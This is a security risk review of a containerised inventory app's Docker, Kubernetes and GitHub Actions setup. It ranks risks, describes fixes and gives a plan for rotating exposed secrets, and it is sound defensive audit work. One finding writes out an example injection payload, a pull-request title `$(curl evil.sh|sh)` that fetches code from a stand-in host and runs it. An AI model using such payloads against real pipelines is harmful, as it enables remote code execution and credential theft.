# StockDesk — Risk Review

This review covers the Dockerfile, docker-compose.yml, Kubernetes manifests
and GitHub Actions pipeline as received from the departed contractor
(repository `devsecops/stockdesk/`, committed here unchanged as
`chore: original repository as received`), ahead of opening StockDesk to
external suppliers next month.

File:line references below point at the **original** files (before this
review's fixes), so the risk is visible against the code that actually
shipped. Current fixed versions are in the same paths in this repo.

## Assumptions

Three questions were sent (GitHub plan, cluster namespace/policy
enforcement, stock data confidentiality) and got no answer before this
review started. In their absence, this review assumes the worst case on
purpose — it is cheaper to over-fix a review than to under-fix a production
incident:

1. **All secrets found in the repo are live production values and are
   already compromised.** `.env`, `k8s/secret.yaml`, the password in
   `docker-compose.yml`, and `DEPLOY_TOKEN` in the pipeline are treated as
   real, not placeholders — ~40 people (including an external contractor)
   have had read access to them for an unknown amount of time.
2. **`KUBECONFIG` grants cluster-admin.** It was created by the contractor
   who has since left, and nobody can currently confirm its actual scope.
3. **The `LoadBalancer` Service, including the debug port 9229, is reachable
   from the Internet.** Nobody has confirmed otherwise.
4. **GitHub plan is Team.** Environments and environment secrets exist, and
   a "only main can deploy" rule can be enforced — but *required reviewers*
   on a protected environment need GitHub Enterprise on a private repo.
   This review assumes Team and flags Enterprise as a recommended upgrade
   rather than assuming a feature that might not be purchasable.
5. **Pod Security Admission and NetworkPolicy enforcement on the shared
   cluster are unconfirmed.** The corresponding manifests in this repo are
   delivered "ready, enforcement to verify" — they will only do something if
   the cluster's admission controllers are actually turned on.
6. **Stock data becomes confidential once suppliers can read it** — current
   stock levels and SKUs reveal purchasing patterns and negotiating
   leverage to outside parties.

## Risk table

| ID | Where (original file:line) | What could concretely happen | Severity | Status | What I did |
|----|------|------|----------|--------|------------|
| R1 | `Dockerfile:8,11`; `k8s/deployment.yaml:25-26,45,52-54` | Node's `--inspect` debugger listens on `0.0.0.0:9229` with **no authentication**. The Kubernetes Service exposes that same port 9229 via `LoadBalancer`. Anyone who can reach it (assumed: the Internet) can attach a debugger and run arbitrary JavaScript in the process — full remote code execution, no credentials needed. | Critical | Fixed | Removed `--inspect` and port 9229 from the image (Dockerfile), the container, and the Service; Service changed to `ClusterIP`. |
| R2 | `.github/workflows/ci.yml:6-7,9,20-22,47-57` | `pull_request_target` runs with the *base* repo's secrets/permissions, but checks out the **PR author's own code** (`github.event.pull_request.head.sha`) and runs it with `permissions: write-all`, `KUBECONFIG`, and `DEPLOY_TOKEN` available. Since ~40 people (including an external contractor) can open PRs and forks are allowed, any of them can submit a PR that, when this workflow runs their code, exfiltrates the cluster credentials (assumed cluster-admin) and the registry token. | Critical | Fixed | Trigger changed to plain `pull_request` (no secrets, no elevated permissions); `push` restricted to `main`; top-level `permissions: contents: read`; deploy only runs on push to `main` with `environment: production`. |
| R3 | `.env:1-8`; `k8s/secret.yaml:1-12`; `docker-compose.yml:17`; `.github/workflows/ci.yml:14`; `Dockerfile:4` (no `.dockerignore`) | Real-looking production DB password and API key committed in plaintext (`.env`), base64 "encoded" (not encrypted — trivially decoded) in `k8s/secret.yaml`, hardcoded again in `docker-compose.yml`, and a deploy token hardcoded in the workflow. `COPY . .` with no `.dockerignore` would also bake `.env` straight into the image if one existed at build time. | Critical | Fixed (tracking stopped; rotation still required — see below) | `.env` and `k8s/secret.yaml` removed from git tracking (`git rm`), `.gitignore` updated, `.env.example` added with placeholders, `.dockerignore` added, Secret now created in-cluster by CI from GitHub environment secrets instead of a file in Git. **The values themselves are not yet rotated** — see "Secrets already exposed" below; stopping tracking does not undo exposure to the ~40 existing clones. |
| R4 | `src/server.js:66`; `.github/workflows/ci.yml:39` | Startup log prints the full config object (including `dbPassword` and `apiKey`) to stdout; the workflow explicitly echoes `DEPLOY_TOKEN`. Both land in logs that more people can read than should see the secret. | High | Fixed | Added `redactConfig()`, used before logging; removed the token-echoing step; test added to check the config never prints `***`-free. |
| R5 | `Dockerfile` (no `USER`); `k8s/deployment.yaml:5` (`namespace: default`), no `securityContext`/resources anywhere | Container runs as root with no Kubernetes security hardening, in the `default` namespace shared with every other team on the cluster. A compromised process has full container-root rights and no isolation from neighbouring workloads. | High | Fixed | Dedicated `stockdesk` namespace with Pod Security Admission `restricted` label; pod/container `securityContext` (non-root uid 1000, `readOnlyRootFilesystem`, `allowPrivilegeEscalation: false`, capabilities dropped), resource requests/limits, `automountServiceAccountToken: false`. |
| R6 | `.github/workflows/ci.yml:35` | `echo "Building '${{ github.event.pull_request.title }}' for ..."` interpolates an attacker-controlled string (the PR title) directly into a shell command — a PR titled `` $(curl evil.sh\|sh) `` would execute on the runner. Classic script injection. | High | Fixed | Step removed entirely; it added no functional value. |
| R7 | `.github/workflows/ci.yml:32` | `npm test \|\| true` makes the job report success even when tests fail, so broken code can still reach the deploy job. | Medium | Fixed | `\|\| true` removed. |
| R8 | `.github/workflows/ci.yml:4-5` | `push: branches: ["**"]` lets a push to *any* branch build and (via the `deploy` job dependency) potentially trigger a cluster deploy. | Medium | Fixed | Restricted to `push: branches: [main]`, and the release job additionally gates on `github.ref == 'refs/heads/main'`. |
| R9 | `Dockerfile:1`; `docker-compose.yml:14`; `k8s/deployment.yaml:20`; `.github/workflows/ci.yml:20,24,54` | `node:latest`, `postgres:latest`, `stockdesk:latest`, `node-version: latest`, and a third-party action pinned to `@main` are all moving targets — the exact code running can change without anyone noticing or being able to reproduce a past build. | Medium | Fixed | Images pinned to specific tags (`node:20-alpine`, `postgres:16-alpine`, both with `# TODO verify digest`); deployment image pinned to the git SHA via CI; Node version pinned to `"20"`; GitHub Actions pinned to verified commit SHAs; the unverifiable third-party action removed (see R-replace below). |
| R10 | `k8s/deployment.yaml:30-37` | The only probe is a `livenessProbe` on `/health`, which checks the database, with `timeoutSeconds: 1`. A slow or down database causes Kubernetes to **kill otherwise-healthy app pods**, turning a database blip into a full application outage. | Medium | Fixed | Added `/livez` (no DB dependency) for liveness; `/health` moved to `readinessProbe` with `timeoutSeconds: 3`. |
| R11 | `k8s/deployment.yaml:9` | `replicas: 1` — any single pod restart or node drain causes a full outage. | Low | Fixed | `replicas: 2` + a `PodDisruptionBudget` with `minAvailable: 1`. |
| R12 | `docker-compose.yml:6-7,19-20` + header comment "Local and test-server stack" | Ports published on all interfaces (no host IP) for the app (`3000`), the debugger (`9229`), and raw PostgreSQL (`5432`). The ambiguous header comment is itself evidence this file *was* run somewhere shared. | Medium | Fixed | Ports bound to `127.0.0.1` only; debug port removed; header comment makes "local development only" explicit; password sourced from `.env` instead of hardcoded. |
| R13 | `src/server.js:35,40` | `GET /health` and `GET /api/products` have no authentication at all — once reachable (even just inside the cluster), anyone can read all stock levels and SKUs. | Medium | Left | Not changed at the app layer — see DESIGN-NOTE.md for why. Reduced in practice: `ClusterIP` + default-deny `NetworkPolicy` (Step 4a/4b) mean these routes are no longer reachable from outside the cluster/ingress path at all today. |
| R14 | `src/server.js:14,44` | A single shared `API_KEY` for the adjust endpoint. Once suppliers are added, there is no way to revoke one supplier's access without breaking everyone else's, and no way to attribute an action to a specific supplier. | Medium | Left | Recommended in THREAT-NOTE.md: one key per supplier before onboarding any of them. Not implemented — would need a small key→identity lookup, judged out of scope for this pass. |
| R15 | `src/server.js:44` | `req.headers["x-api-key"] !== config.apiKey` is a plain string comparison, not constant-time — theoretically vulnerable to a timing attack that recovers the key byte-by-byte. | Low | Left | Low practical risk over a real network (timing noise dwarfs the signal) given the time available; noted for completeness. |
| R16 | `src/server.js:47-49` | The adjust endpoint buffers the entire request body into a JS string (`raw += c`) with no size cap — a large or slow request can exhaust memory. | Medium | Left | Not fixed in this pass; flagged as a one-day-more item. |
| R17 | app-wide | No rate limiting anywhere. Once suppliers (external parties) have API access, nothing stops one from hammering the API. | Medium | Left | Recommended at the Ingress layer in `docs/ingress-example.yaml`'s comments and THREAT-NOTE.md; not implemented. |
| R18 | app-wide | The app only ever speaks plain HTTP; nothing in the original delivery terminates TLS anywhere before suppliers would be involved. | High (once suppliers are external) | Reduced | `docs/ingress-example.yaml` shows TLS termination at an Ingress as the recommended path; not applied by CI, a decision still pending (your call, per the brief). |

### Why this top-5 order

1. **R1 (debugger on the internet)** ranks first because it requires zero
   credentials and gives full code execution immediately — the single
   worst possible outcome, and (under the stated assumptions) already
   exploitable today.
2. **R2 (`pull_request_target` + write-all)** is next because it is the
   widest *door*: it turns "40 people can open a PR" into "40 people can get
   the cluster and the registry," with no code execution bug required at
   all — just opening a PR.
3. **R3 (live secrets in Git)** ranks third: real credentials sitting in
   history that ~40 clones already have. It doesn't grant access by itself
   the way R1/R2 do (no active exploit path, "just" exposure) which is why
   it sits below them, but it's a Critical, standing problem.
4. **R4 (secrets in logs)** is a second, ongoing channel for the same
   secrets to leak even after R3 is fixed — logs typically live longer and
   reach more people than the source repo does.
5. **R5 (root container, no hardening, default namespace)** ranks fifth:
   it doesn't expose a secret or grant remote access by itself, but it
   maximizes the damage *any other* compromise (including one we haven't
   thought of) can do, on a cluster shared with other teams.

## Secrets already exposed — what to do, in which order, by whom

**Why contain before rotate:** rotating a secret while the hole that leaked
it is still open just produces a second leaked secret. Each step below
closes a door; only once a door is closed does rotating the key behind it
actually help.

0. **Contain** — *cluster admin + GitHub org admin, together, first.*
   Remove port 9229 from the Service (or scale the deployment to 0
   immediately if that can't happen fast enough), disable the
   `build-and-deploy` workflow, and revoke the departed contractor's access
   to both GitHub and the cluster. Nothing below matters if these are still
   open.
1. **`KUBECONFIG`** — revoke it at the cluster. Replace it with a
   ServiceAccount + Role scoped to the `stockdesk` namespace only (never
   cluster-admin again), stored as a GitHub environment secret. Audit the
   cluster's audit log (if any) for anything the old credential did that
   nobody can explain.
2. **`DEPLOY_TOKEN`**/registry token — revoke it, issue a new one scoped to
   the `production` environment only, and check the registry for any image
   nobody on the team remembers pushing.
3. **`API_KEY`** — issue a new key, inform every legitimate holder of the
   old one out of band, and plan to move to one key per supplier (R14)
   before any supplier is onboarded, so a single revocation never affects
   everyone else.
4. **`DB_PASSWORD`** — rotate during a maintenance window (the app will
   need a restart with the new value), and check database logs for
   connections from IPs/hosts nobody recognizes.
5. **Only now**, remove the files from Git tracking (already done in this
   review) and *optionally* rewrite history with `git filter-repo` — optional
   because all ~40 existing clones still have the old history regardless of
   what the central repo says. Rotation (steps 1-4) is what actually
   protects you; rewriting history is cleanup, not protection.
6. **Enable GitHub secret scanning / push protection** on the repository
   going forward, so a future accidental commit of a real secret is blocked
   before it merges, not discovered after.

## What I did not verify

- `docker build` actually succeeding end-to-end (no Docker daemon available
  while doing this review).
- The GitHub Actions pipeline running for real (no CI was triggered).
- The Kubernetes manifests actually applying to a real cluster.
- Whether Pod Security Admission or the NetworkPolicy are actually enforced
  on the target cluster — the manifests are ready, enforcement is not
  confirmed.
- Exact digests for `node:20-alpine` and `postgres:16-alpine` (left as
  `# TODO verify digest`).
- Whether the GitHub plan is actually Team (assumed) — if it's Enterprise,
  required reviewers on the `production` environment should be turned on
  immediately; if it's below Team, environments/environment secrets may
  not be available at all and the KUBECONFIG/registry secrets would need a
  different isolation mechanism.
